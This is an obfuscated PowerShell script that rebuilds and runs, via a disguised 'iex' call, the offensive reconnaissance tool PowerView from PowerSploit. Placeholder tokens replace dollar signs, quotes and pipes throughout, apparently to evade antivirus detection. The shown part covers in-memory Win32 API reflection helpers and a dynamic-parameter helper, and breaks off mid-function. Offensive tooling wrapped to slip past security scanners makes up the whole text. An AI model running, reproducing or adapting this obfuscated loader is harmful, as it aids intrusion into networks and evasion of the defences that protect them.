&( ([String]$VerbosePreference)[1,3]+'x'-Join'')(('#requires -version 2

<#

PowerSploit File: PowerView.ps1
Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

#>


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the q4gUenumq4gU,
q4gUstructq4gU, and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

RaUModule = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseShouldProcessForStateChangingFunctionsq4gU, q4gUq4gU)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUModuleName = [Guid]::NewGuid().ToString()
    )

    RaUAppDomain = [Reflection.Assembly].Assembly.GetType(q4gUSystem.AppDomainq4gU).GetProperty(q4gUCurrentDomainq4gU).GetValue(RaUnull, @())
    RaULoadedAssemblies = RaUAppDomain.GetAssemblies()

    foreach (RaUAssembly in RaULoadedAssemblies) {
        if (RaUAssembly.FullName -and (RaUAssembly.FullName.Split(q4gU,q4gU)[0] -eq RaUModuleName)) {
            return RaUAssembly
        }
    }

    RaUDynAssembly = New-Object Reflection.AssemblyName(RaUModuleName)
    RaUDomain = RaUAppDomain
    RaUAssemblyBuilder = RaUDomain.DefineDynamicAssembly(RaUDynAssembly, q4gURunq4gU)
    RaUModuleBuilder = RaUAssemblyBuilder.DefineDynamicModule(RaUModuleName, RaUFalse)

    return RaUModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func {
    Param (
        [Parameter(Position = 0, Mandatory = RaUTrue)]
        [String]
        RaUDllName,

        [Parameter(Position = 1, Mandatory = RaUTrue)]
        [string]
        RaUFunctionName,

        [Parameter(Position = 2, Mandatory = RaUTrue)]
        [Type]
        RaUReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        RaUParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        RaUNativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        RaUCharset,

        [String]
        RaUEntryPoint,

        [Switch]
        RaUSetLastError
    )

    RaUProperties = @{
        DllName = RaUDllName
        FunctionName = RaUFunctionName
        ReturnType = RaUReturnType
    }

    if (RaUParameterTypes) { RaUProperties[q4gUParameterTypesq4gU] = RaUParameterTypes }
    if (RaUNativeCallingConvention) { RaUProperties[q4gUNativeCallingConventionq4gU] = RaUNativeCallingConvention }
    if (RaUCharset) { RaUProperties[q4gUCharsetq4gU] = RaUCharset }
    if (RaUSetLastError) { RaUProperties[q4gUSetLastErrorq4gU] = RaUSetLastError }
    if (RaUEntryPoint) { RaUProperties[q4gUEntryPointq4gU] = RaUEntryPoint }

    New-Object PSObject -Property RaUProperties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The q4gUfuncq4gU helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an q4gUAq4gU or q4gUWq4gU Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

RaUMod = New-InMemoryModule -ModuleName Win32

RaUFunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

RaUTypes = RaUFunctionDefinitions wZ5t Add-Win32Type -Module RaUMod -Namespace q4gUWin32q4gU
RaUKernel32 = RaUTypes[q4gUkernel32q4gU]
RaUNtdll = RaUTypes[q4gUntdllq4gU]
RaUNtdll::RtlGetCurrentPeb()
RaUntdllbase = RaUKernel32::GetModuleHandle(q4gUntdllq4gU)
RaUKernel32::GetProcAddress(RaUntdllbase, q4gURtlGetCurrentPebq4gU)

.NOTES

Inspired by Lee Holmesq4gU Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=RaUTrue, ValueFromPipelineByPropertyName=RaUTrue)]
        [String]
        RaUDllName,

        [Parameter(Mandatory=RaUTrue, ValueFromPipelineByPropertyName=RaUTrue)]
        [String]
        RaUFunctionName,

        [Parameter(ValueFromPipelineByPropertyName=RaUTrue)]
        [String]
        RaUEntryPoint,

        [Parameter(Mandatory=RaUTrue, ValueFromPipelineByPropertyName=RaUTrue)]
        [Type]
        RaUReturnType,

        [Parameter(ValueFromPipelineByPropertyName=RaUTrue)]
        [Type[]]
        RaUParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=RaUTrue)]
        [Runtime.InteropServices.CallingConvention]
        RaUNativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=RaUTrue)]
        [Runtime.InteropServices.CharSet]
        RaUCharset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=RaUTrue)]
        [Switch]
        RaUSetLastError,

        [Parameter(Mandatory=RaUTrue)]
        [ValidateScript({(RaU_ -is [Reflection.Emit.ModuleBuilder]) -or (RaU_ -is [Reflection.Assembly])})]
        RaUModule,

        [ValidateNotNull()]
        [String]
        RaUNamespace = q4gUq4gU
    )

    BEGIN
    {
        RaUTypeHash = @{}
    }

    PROCESS
    {
        if (RaUModule -is [Reflection.Assembly])
        {
            if (RaUNamespace)
            {
                RaUTypeHash[RaUDllName] = RaUModule.GetType(Oj8XRaUNamespace.RaUDllNameOj8X)
            }
            else
            {
                RaUTypeHash[RaUDllName] = RaUModule.GetType(RaUDllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!RaUTypeHash.ContainsKey(RaUDllName))
            {
                if (RaUNamespace)
                {
                    RaUTypeHash[RaUDllName] = RaUModule.DefineType(Oj8XRaUNamespace.RaUDllNameOj8X, q4gUPublic,BeforeFieldInitq4gU)
                }
                else
                {
                    RaUTypeHash[RaUDllName] = RaUModule.DefineType(RaUDllName, q4gUPublic,BeforeFieldInitq4gU)
                }
            }

            RaUMethod = RaUTypeHash[RaUDllName].DefineMethod(
                RaUFunctionName,
                q4gUPublic,Static,PinvokeImplq4gU,
                RaUReturnType,
                RaUParameterTypes)

            # Make each ByRef parameter an Out parameter
            RaUi = 1
            foreach(RaUParameter in RaUParameterTypes)
            {
                if (RaUParameter.IsByRef)
                {
                    [void] RaUMethod.DefineParameter(RaUi, q4gUOutq4gU, RaUnull)
                }

                RaUi++
            }

            RaUDllImport = [Runtime.InteropServices.DllImportAttribute]
            RaUSetLastErrorField = RaUDllImport.GetField(q4gUSetLastErrorq4gU)
            RaUCallingConventionField = RaUDllImport.GetField(q4gUCallingConventionq4gU)
            RaUCharsetField = RaUDllImport.GetField(q4gUCharSetq4gU)
            RaUEntryPointField = RaUDllImport.GetField(q4gUEntryPointq4gU)
            if (RaUSetLastError) { RaUSLEValue = RaUTrue } else { RaUSLEValue = RaUFalse }

            if (RaUPSBoundParameters[q4gUEntryPointq4gU]) { RaUExportedFuncName = RaUEntryPoint } else { RaUExportedFuncName = RaUFunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            RaUConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            RaUDllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(RaUConstructor,
                RaUDllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(RaUSetLastErrorField,
                                           RaUCallingConventionField,
                                           RaUCharsetField,
                                           RaUEntryPointField),
                [Object[]] @(RaUSLEValue,
                             ([Runtime.InteropServices.CallingConvention] RaUNativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] RaUCharset),
                             RaUExportedFuncName))

            RaUMethod.SetCustomAttribute(RaUDllImportAttribute)
        }
    }

    END
    {
        if (RaUModule -is [Reflection.Assembly])
        {
            return RaUTypeHash
        }

        RaUReturnTypes = @{}

        foreach (RaUKey in RaUTypeHash.Keys)
        {
            RaUType = RaUTypeHash[RaUKey].CreateType()

            RaUReturnTypes[RaUKey] = RaUType
        }

        return RaUReturnTypes
    }
}


function psenum {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The q4gUpsenumq4gU function facilitates the creation of enums entirely in
memory using as close to a Oj8XC styleOj8X as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

RaUMod = New-InMemoryModule -ModuleName Win32

RaUImageSubsystem = psenum RaUMod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesnq4gUt require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a Oj8XC styleOj8X
definition as closely as possible. Sorry, Iq4gUm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=RaUTrue)]
        [ValidateScript({(RaU_ -is [Reflection.Emit.ModuleBuilder]) -or (RaU_ -is [Reflection.Assembly])})]
        RaUModule,

        [Parameter(Position = 1, Mandatory=RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUFullName,

        [Parameter(Position = 2, Mandatory=RaUTrue)]
        [Type]
        RaUType,

        [Parameter(Position = 3, Mandatory=RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        RaUEnumElements,

        [Switch]
        RaUBitfield
    )

    if (RaUModule -is [Reflection.Assembly])
    {
        return (RaUModule.GetType(RaUFullName))
    }

    RaUEnumType = RaUType -as [Type]

    RaUEnumBuilder = RaUModule.DefineEnum(RaUFullName, q4gUPublicq4gU, RaUEnumType)

    if (RaUBitfield)
    {
        RaUFlagsConstructor = [FlagsAttribute].GetConstructor(@())
        RaUFlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(RaUFlagsConstructor, @())
        RaUEnumBuilder.SetCustomAttribute(RaUFlagsCustomAttribute)
    }

    foreach (RaUKey in RaUEnumElements.Keys)
    {
        # Apply the specified enum type to each element
        RaUnull = RaUEnumBuilder.DefineLiteral(RaUKey, RaUEnumElements[RaUKey] -as RaUEnumType)
    }

    RaUEnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field {
    Param (
        [Parameter(Position = 0, Mandatory=RaUTrue)]
        [UInt16]
        RaUPosition,

        [Parameter(Position = 1, Mandatory=RaUTrue)]
        [Type]
        RaUType,

        [Parameter(Position = 2)]
        [UInt16]
        RaUOffset,

        [Object[]]
        RaUMarshalAs
    )

    @{
        Position = RaUPosition
        Type = RaUType -as [Type]
        Offset = RaUOffset
        MarshalAs = RaUMarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The q4gUstructq4gU function facilitates the creation of structs entirely in
memory using as close to a Oj8XC styleOj8X as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of q4gUstructq4gU is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the q4gUfieldq4gU helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

RaUMod = New-InMemoryModule -ModuleName Win32

RaUImageDosSignature = psenum RaUMod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

RaUImageDosHeader = struct RaUMod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 RaUImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @(q4gUByValArrayq4gU, 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @(q4gUByValArrayq4gU, 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
RaUTestUnion = struct RaUMod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a Oj8XC styleOj8X
definition as closely as possible. Sorry, Iq4gUm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=RaUTrue)]
        [ValidateScript({(RaU_ -is [Reflection.Emit.ModuleBuilder]) -or (RaU_ -is [Reflection.Assembly])})]
        RaUModule,

        [Parameter(Position = 2, Mandatory=RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUFullName,

        [Parameter(Position = 3, Mandatory=RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        RaUStructFields,

        [Reflection.Emit.PackingSize]
        RaUPackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        RaUExplicitLayout
    )

    if (RaUModule -is [Reflection.Assembly])
    {
        return (RaUModule.GetType(RaUFullName))
    }

    [Reflection.TypeAttributes] RaUStructAttributes = q4gUAnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInitq4gU

    if (RaUExplicitLayout)
    {
        RaUStructAttributes = RaUStructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        RaUStructAttributes = RaUStructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    RaUStructBuilder = RaUModule.DefineType(RaUFullName, RaUStructAttributes, [ValueType], RaUPackingSize)
    RaUConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    RaUSizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(q4gUSizeConstq4gU))

    RaUFields = New-Object Hashtable[](RaUStructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesnq4gUt have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach (RaUField in RaUStructFields.Keys)
    {
        RaUIndex = RaUStructFields[RaUField][q4gUPositionq4gU]
        RaUFields[RaUIndex] = @{FieldName = RaUField; Properties = RaUStructFields[RaUField]}
    }

    foreach (RaUField in RaUFields)
    {
        RaUFieldName = RaUField[q4gUFieldNameq4gU]
        RaUFieldProp = RaUField[q4gUPropertiesq4gU]

        RaUOffset = RaUFieldProp[q4gUOffsetq4gU]
        RaUType = RaUFieldProp[q4gUTypeq4gU]
        RaUMarshalAs = RaUFieldProp[q4gUMarshalAsq4gU]

        RaUNewField = RaUStructBuilder.DefineField(RaUFieldName, RaUType, q4gUPublicq4gU)

        if (RaUMarshalAs)
        {
            RaUUnmanagedType = RaUMarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (RaUMarshalAs[1])
            {
                RaUSize = RaUMarshalAs[1]
                RaUAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(RaUConstructorInfo,
                    RaUUnmanagedType, RaUSizeConst, @(RaUSize))
            }
            else
            {
                RaUAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(RaUConstructorInfo, [Object[]] @(RaUUnmanagedType))
            }

            RaUNewField.SetCustomAttribute(RaUAttribBuilder)
        }

        if (RaUExplicitLayout) { RaUNewField.SetOffset(RaUOffset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    RaUSizeMethod = RaUStructBuilder.DefineMethod(q4gUGetSizeq4gU,
        q4gUPublic, Staticq4gU,
        [Int],
        [Type[]] @())
    RaUILGenerator = RaUSizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    RaUILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, RaUStructBuilder)
    RaUILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(q4gUGetTypeFromHandleq4gU))
    RaUILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(q4gUSizeOfq4gU, [Type[]] @([Type])))
    RaUILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    RaUImplicitConverter = RaUStructBuilder.DefineMethod(q4gUop_Implicitq4gU,
        q4gUPrivateScope, Public, Static, HideBySig, SpecialNameq4gU,
        RaUStructBuilder,
        [Type[]] @([IntPtr]))
    RaUILGenerator2 = RaUImplicitConverter.GetILGenerator()
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, RaUStructBuilder)
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(q4gUGetTypeFromHandleq4gU))
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(q4gUPtrToStructureq4gU, [Type[]] @([IntPtr], [Type])))
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, RaUStructBuilder)
    RaUILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    RaUStructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

Function New-DynamicParameter {
<#
.SYNOPSIS

Helper function to simplify creating dynamic parameters.

    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
    Originally released under the Microsoft Public License (Ms-PL).

.DESCRIPTION

Helper function to simplify creating dynamic parameters.

Example use cases:
    Include parameters only if your environment dictates it
    Include parameters depending on the value of a user-specified parameter
    Provide tab completion and intellisense for parameters, depending on the environment

Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
    Use New-DynamicParameter with q4gUCreateVariablesq4gU switch in your main code block,
    (q4gUProcessq4gU for advanced functions) to create those variables.
    Alternatively, manually reference RaUPSBoundParameters for the dynamic parameter value.

This function has two operating modes:

1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.

2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
with custom conditions and so on.

.NOTES

Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/

Credit to BM for alias and type parameters and their handling

.PARAMETER Name

Name of the dynamic parameter

.PARAMETER Type

Type for the dynamic parameter.  Default is string

.PARAMETER Alias

If specified, one or more aliases to assign to the dynamic parameter

.PARAMETER Mandatory

If specified, set the Mandatory attribute for this dynamic parameter

.PARAMETER Position

If specified, set the Position attribute for this dynamic parameter

.PARAMETER HelpMessage

If specified, set the HelpMessage for this dynamic parameter

.PARAMETER DontShow

If specified, set the DontShow for this dynamic parameter.
This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/

.PARAMETER ValueFromPipeline

If specified, set the ValueFromPipeline attribute for this dynamic parameter

.PARAMETER ValueFromPipelineByPropertyName

If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter

.PARAMETER ValueFromRemainingArguments

If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter

.PARAMETER ParameterSetName

If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.

.PARAMETER AllowNull

If specified, set the AllowNull attribute of this dynamic parameter

.PARAMETER AllowEmptyString

If specified, set the AllowEmptyString attribute of this dynamic parameter

.PARAMETER AllowEmptyCollection

If specified, set the AllowEmptyCollection attribute of this dynamic parameter

.PARAMETER ValidateNotNull

If specified, set the ValidateNotNull attribute of this dynamic parameter

.PARAMETER ValidateNotNullOrEmpty

If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter

.PARAMETER ValidateRange

If specified, set the ValidateRange attribute of this dynamic parameter

.PARAMETER ValidateLength

If specified, set the ValidateLength attribute of this dynamic parameter

.PARAMETER ValidatePattern

If specified, set the ValidatePattern attribute of this dynamic parameter

.PARAMETER ValidateScript

If specified, set the ValidateScript attribute of this dynamic parameter

.PARAMETER ValidateSet

If specified, set the ValidateSet attribute of this dynamic parameter

.PARAMETER Dictionary

If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
Appropriate for custom dynamic parameters creation.

If not specified, create and return a RuntimeDefinedParameterDictionary
Appropriate for a simple dynamic parameter creation.
#>

    [CmdletBinding(DefaultParameterSetName = q4gUDynamicParameterq4gU)]
    Param (
        [Parameter(Mandatory = RaUtrue, ValueFromPipeline = RaUtrue, ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateNotNullOrEmpty()]
        [string]RaUName,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [System.Type]RaUType = [int],

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [string[]]RaUAlias,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUMandatory,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [int]RaUPosition,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [string]RaUHelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUDontShow,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [string]RaUParameterSetName = q4gU__AllParameterSetsq4gU,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUAllowNull,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUAllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUAllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [switch]RaUValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateCount(2,2)]
        [int[]]RaUValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateCount(2,2)]
        [int[]]RaUValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateCount(2,2)]
        [int[]]RaUValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateNotNullOrEmpty()]
        [string]RaUValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateNotNullOrEmpty()]
        [scriptblock]RaUValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateNotNullOrEmpty()]
        [string[]]RaUValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUDynamicParameterq4gU)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(RaU_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw q4gUDictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary objectq4gU
            }
            RaUtrue
        })]
        RaUDictionary = RaUfalse,

        [Parameter(Mandatory = RaUtrue, ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUCreateVariablesq4gU)]
        [switch]RaUCreateVariables,

        [Parameter(Mandatory = RaUtrue, ValueFromPipelineByPropertyName = RaUtrue, ParameterSetName = q4gUCreateVariablesq4gU)]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,
            # so one canq4gUt use PowerShellq4gUs q4gU-isq4gU operator to validate type.
            if(RaU_.GetType().Name -notmatch q4gUDictionaryq4gU) {
                Throw q4gUBoundParameters must be a System.Management.Automation.PSBoundParametersDictionary objectq4gU
            }
            RaUtrue
        })]
        RaUBoundParameters
    )

    Begin {
        RaUInternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        RaUCommonParameters = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if(RaUCreateVariables) {
            RaUBoundKeys = RaUBoundParameters.Keys wZ5t Where-Object { RaUCommonParameters -notcontains RaU_ }
            ForEach(RaUParameter in RaUBoundKeys) {
                if (RaUParameter) {
                    Set-Variable -Name RaUParameter -Value RaUBoundParameters.RaUParameter -Scope 1 -Force
                }
            }
        }
        else {
            RaUStaleKeys = @()
            RaUStaleKeys = RaUPSBoundParameters.GetEnumerator() wZ5t
                        ForEach-Object {
                            if(RaU_.Value.PSobject.Methods.Name -match q4gU^EqualsRaUq4gU) {
                                # If object has Equals, compare bound key and variable using it
